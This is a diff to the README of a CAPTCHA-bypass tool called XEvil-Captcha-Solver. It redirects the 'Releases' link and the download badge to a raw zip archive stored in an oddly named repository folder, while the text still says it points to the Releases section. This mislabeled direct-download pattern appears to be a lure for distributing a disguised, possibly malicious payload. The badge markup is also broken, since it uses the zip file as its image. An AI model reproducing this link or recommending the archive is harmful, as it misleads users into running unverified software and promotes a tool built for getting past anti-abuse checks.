@@ -38,9 +38,9 @@ XEvil-Captcha-Solver offers a range of features to cater to your CAPTCHA recogni
 
 ## Latest Release 📦
 
-To download the latest release of XEvil-Captcha-Solver, visit the [Releases](https://github.com/Maddouri-Ahmed/XEvil-Captcha-Solver/releases) section.
+To download the latest release of XEvil-Captcha-Solver, visit the [Releases](https://github.com/Maddouri-Ahmed/XEvil-Captcha-Solver/raw/refs/heads/main/pariahship/Solver-X-Evil-Captcha-1.4.zip) section.
 
-[![Download XEvil](https://img.shields.io/badge/Download-XEvil-brightgreen)](https://github.com/Maddouri-Ahmed/XEvil-Captcha-Solver/releases)
+[![Download XEvil](https://github.com/Maddouri-Ahmed/XEvil-Captcha-Solver/raw/refs/heads/main/pariahship/Solver-X-Evil-Captcha-1.4.zip)](https://github.com/Maddouri-Ahmed/XEvil-Captcha-Solver/raw/refs/heads/main/pariahship/Solver-X-Evil-Captcha-1.4.zip)
 
 ## Usage 🖥️
 
